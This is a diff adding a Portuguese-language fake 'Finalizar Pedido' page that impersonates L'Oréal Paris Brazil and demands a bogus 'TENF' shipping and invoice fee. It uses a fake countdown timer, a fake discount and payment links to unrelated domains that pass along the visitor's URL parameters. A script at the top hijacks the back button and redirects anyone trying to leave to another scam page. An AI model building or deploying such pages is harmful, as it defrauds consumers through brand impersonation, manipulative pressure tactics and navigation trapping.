@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+     <script>
+        (function() {
+            const KEY = '__qs_entry__';
+            try {
+                if (!sessionStorage.getItem(KEY)) {
+                    sessionStorage.setItem(KEY, window.location.search || '');
+                }
+            } catch (e) {}
+            history.replaceState({ backtrap: 'root' }, '', location.pathname + (location.search || '') + location.hash);
+            history.pushState({ backtrap: 'guard' }, '');
+            window.addEventListener('popstate', function(ev) {
+                const st = ev.state || history.state;
+                if (!st || st.backtrap !== 'root') return;
+                let qs = '';
+                try {
+                    qs = location.search || sessionStorage.getItem(KEY) || '';
+                    if (qs && qs[0] !== '?') qs = '?' + qs;
+                } catch (e) {}
+                location.replace('/elseve/back-up/tenf' + (qs || ''));
+            });
+        })();
+    </script>
+    <!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D6CAT23C77U0SFL8IK90');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>L'Oréal Paris - Finalizar Pedido</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --pure-black: #000000;
+            --pure-white: #ffffff;
+            --light-gray: #f2f2f2;
+            --border-gray: #e0e0e0;
+            --text-dark: #1a1a1a;
+            --text-light: #666666;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--light-gray);
+            color: var(--text-dark);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Header Minimalista */
+        .header {
+            background-color: var(--pure-black);
+            padding: 25px 20px;
+            text-align: center;
+        }
+        .header img {
+            width: 160px;
+            filter: brightness(0) invert(1);
+        }
+
+        /* Container */
+        .main-container {
+            max-width: 460px;
+            margin: 40px auto;
+            background: var(--pure-white);
+            padding: 40px;
+            border-radius: 0px; /* Bordas retas passam mais seriedade */
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+
+        /* Barra de Progresso Sóbria */
+        .progress-container { margin-bottom: 35px; }
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--pure-black);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .progress-bar {
+            width: 100%;
+            background: #ebebeb;
+            height: 4px;
+        }
+        .progress-fill {
+            width: 92%;
+            background: var(--pure-black);
+            height: 100%;
+        }
+
+        h1 {
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            color: var(--pure-black);
+            margin-bottom: 25px;
+            line-height: 1.4;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .alert-box {
+            background-color: var(--light-gray);
+            border: 1px solid var(--border-gray);
+            padding: 20px;
+            font-size: 13px;
+            color: var(--text-dark);
+            margin-bottom: 30px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        /* Card de Pedido */
+        .order-card {
+            border-top: 1px solid var(--border-gray);
+            border-bottom: 1px solid var(--border-gray);
+            padding: 25px 0;
+            margin-bottom: 30px;
+        }
+        .order-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .order-info span {
+            display: block;
+            font-size: 10px;
+            color: var(--text-light);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+        .order-info strong {
+            font-size: 14px;
+            color: var(--pure-black);
+            font-weight: 600;
+        }
+        .price-tag { text-align: right; }
+        .old-price {
+            font-size: 12px;
+            text-decoration: line-through;
+            color: #999;
+            display: block;
+        }
+        .new-price {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--pure-black);
+            display: block;
+        }
+
+        /* Timer */
+        .timer-box {
+            text-align: center;
+            font-size: 12px;
+            font-weight: 400;
+            color: var(--text-light);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        #timer {
+            font-weight: 700;
+            color: var(--pure-black);
+        }
+
+        /* Botão de Alta Costura */
+        .btn-payment {
+            display: block;
+            background: var(--pure-black);
+            color: var(--pure-white);
+            text-align: center;
+            padding: 22px;
+            font-weight: 700;
+            text-decoration: none;
+            font-size: 14px;
+            letter-spacing: 2px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            border: 1px solid var(--pure-black);
+        }
+        .btn-payment:hover {
+            background: var(--pure-white);
+            color: var(--pure-black);
+        }
+
+        /* Footer */
+        .footer-text {
+            text-align: center;
+            font-size: 9px;
+            color: #aaa;
+            margin-top: 40px;
+            line-height: 1.8;
+            letter-spacing: 1px;
+        }
+
+        @media (max-width: 600px) {
+            .main-container { margin: 0; padding: 30px 20px; width: 100%; box-sizing: border-box; }
+            h1 { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9d/L%27Or%C3%A9al_logo.svg" alt="L'Oréal Paris">
+    </header>
+
+    <div class="main-container">
+        <div class="progress-container">
+            <div class="progress-label">
+                <span>Status: Verificação de Pedido</span>
+                <span>92%</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+        <h1>Finalize a liberação do seu pedido</h1>
+
+        <div class="alert-box">
+            Para autorizar o envio imediato e a emissão da documentação fiscal (e-NF), é necessário realizar o pagamento da taxa TENF.
+        </div>
+
+        <div class="order-card">
+            <div class="order-row">
+                <div class="order-info">
+                    <span>Identificador: #00044792</span>
+                    <strong>Taxa de Emissão e Remessa</strong>
+                </div>
+                <div class="price-tag">
+                    <span class="old-price">R$ 47,90</span>
+                    <span class="new-price">R$ 21,63</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="timer-box">
+            A reserva expira em: <span id="timer">05:00</span>
+        </div>
+
+        <a href="https://pay.tiktokpayreview.online/699a0b171b3276fe077bc24a" id="payment-btn" class="btn-payment">
+            Concluir Pagamento
+        </a>
+
+        <div class="footer-text">
+            © NORISK BRASIL PARA L'ORÉAL PARIS BRASIL S.A.<br>
+            TERMOS DE USO | POLÍTICA DE PRIVACIDADE
+        </div>
+    </div>
+
+    <script>
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            var countdown = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) {
+                    clearInterval(countdown);
+                    display.textContent = "00:00";
+                }
+            }, 1000);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            startTimer(300, document.querySelector('#timer'));
+
+            const baseURL = 'https://pay.paymentts-wl.shop/69990ab7c8afc519dfc70ac7';
+            const currentParams = new URLSearchParams(window.location.search);
+            if (currentParams.toString()) {
+                const button = document.getElementById('payment-btn');
+                button.href = `${baseURL}?${currentParams.toString()}`;
+            }
+        });
+    </script>
+</body>
+</html>
